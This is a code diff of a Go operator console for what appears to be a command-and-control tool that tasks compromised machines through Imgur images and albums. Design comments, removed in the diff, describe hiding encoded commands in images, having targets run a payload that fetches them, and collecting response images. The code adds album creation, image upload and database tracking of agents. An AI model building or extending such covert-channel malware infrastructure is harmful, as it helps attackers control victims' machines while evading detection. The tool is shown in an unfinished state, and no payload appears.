@@ -1,38 +1,3 @@
-// TODO:
-// Error handling []
-// Display walkthroughs for each module [√]
-// Fix the tasking module since I commented out the upload function
-// Set up mysql and configure it for multiple agent handlings []
-// Make the album go function add to the databse, because right now it only lists the most current album hash and title []
-// Error handling for existing tables and what not [√]
-// Set up tasking module / Database []
-// Fix some of the verbiage on the modules so that it makes a bit more sense []
-// Maybe some autocomplete and up arrow stuff []
-// Add the ability to upload to other albums []
-// Change all the options so that when you type "options" and the value exists, it queries the database and not the global maps []
-// 		--> Eh, I think this is fine, I'll try and see what others think
-
-// Thoughts right now is to have a target upload an encoded image after getting tasking, just not sure if the agent definition should be on response or on tasking
-
-// How this should work:
-// Set up a tasking image for a client -> client grabs it, runs it, uploads new(?) image based on description -> server (C2) is keeping track of each agent and checking for responses (New album for each agent/tasking)
-
-/*
- My thought right now is that this will look for any descriptions that mention the word "response"
- For right now, and then maybe get a big dict of words that will mean specific things
-
- Beta build:
-
- 1. Create an image with an encoded command in it
- 2. Create an album for this to go in, with a particular title (That will be created within the payload so that when the agent executes the payload, it will know what album to look for)
- 3. Add "tasking image" to this album (or any other /shrug)
- 4. <Target runs payload, grabs image and decodes/runs payload, uploads new image with response to the same album>
- 5. C2 Server will pull any album it has marked as "ACTIVE", and see if there are any new images
- 6. Either alert the operator or have to operator do a manual check, and show that there is a new image with a reponse in it
- 7. Either auto-show the response to the operator or have the operator use the Reponse module to check the response for a particular target
-
-*/
-
 package main
 
 import (
@@ -92,7 +57,7 @@ func yesNo() bool {
 	}
 	_, result, err := prompt.Run()
 	if err != nil {
-		log.Fatalf("Prompt failed %v\n", err)
+		log.Printf("Prompt failed %v\n", err)
 	}
 	return result == "Yes"
 }
@@ -278,13 +243,16 @@ func main() {
 					}
 
 				} else if strings.Contains(text, "list") {
-					fmt.Println("\n", color.CyanString("AlbumHash:"), albumOptions["Album Delete-Hash"], "|", color.CyanString("Album ID:"), albumOptions["AlbumID"], "|", color.CyanString("Title:"), albumOptions["Title"])
+					fmt.Println(" ")
+					internal.GetAlbums()
+					//fmt.Println("\n", color.CyanString("AlbumHash:"), albumOptions["Album Delete-Hash"], "|", color.CyanString("Album ID:"), albumOptions["AlbumID"], "|", color.CyanString("Title:"), albumOptions["Title"])
 					fmt.Println(" ")
 
 				} else if strings.Contains(text, "go") {
 					albumID, deletehash := cmd.CreateAlbum(albumOptions["Title"], albumOptions["Client-ID"])
 					albumOptions["AlbumID"] = albumID.(string)
 					albumOptions["Album Delete-Hash"] = deletehash.(string)
+
 					// Utilizes the mysql stuff, currently have it set up on a Docker test server
 					internal.InsertAlbum(albumOptions["Title"], albumOptions["AlbumID"], albumOptions["Album Delete-Hash"])
 
@@ -295,6 +263,7 @@ func main() {
 			}
 
 		}
+
 		if strings.EqualFold(result, "Task") {
 			for {
 				reader := bufio.NewReader(os.Stdin)
@@ -373,19 +342,10 @@ func main() {
 
 				} else if strings.Contains(text, "go") {
 					imageID, deletehash := cmd.UploadImage(taskOptions["TaskingImage"], taskOptions["Title"], taskOptions["AlbumID"], taskOptions["Description"], taskOptions["ClientID"])
+					cmd.AddImage(albumOptions["Album Delete-Hash"], imageOptions["ClientID"], deletehash.(string))
 
 					imgurItems.Put("ImageID", imageID)
 					imgurItems.Put("ImageDeleteHash", deletehash)
-
-					// This is to ask to add to recently created album, I don't think this is a good idea, but I'll leave just in case
-
-					//confirmAdd := yesNo()
-					//if confirmAdd {
-					//cmd.AddImage(albumOptions["Album Delete-Hash"], imageOptions["ClientID"], deletehash.(string))
-					//fmt.Println(color.GreenString("[+]"), "Successfully upload image to Album:", albumOptions["Title"])
-					//internal.InsertTask(taskOptions["TaskingImageRaw"], taskOptions["Title"], taskOptions["Description"], imageID.(string), deletehash.(string))
-					//}
-					//fmt.Println(success, "|", status)
 
 				} else if strings.Contains(text, "exit") {
 					break
@@ -418,6 +378,11 @@ func main() {
 			}
 
 		}
+
+		// This currently fills in the most recent album id, which would contain the image we upload
+		// Realisticly this would check any album of any response
+		// Also would need it to need to know difference between respone and taksing
+		// This could be different description words
 
 		if strings.EqualFold(result, "Response") {
 			for {
@@ -591,6 +556,8 @@ func main() {
 			*/
 		}
 
+		//TODO:
+		// Add list taskings module []
 		if strings.EqualFold(result, "List") {
 			for {
 				reader := bufio.NewReader(os.Stdin)
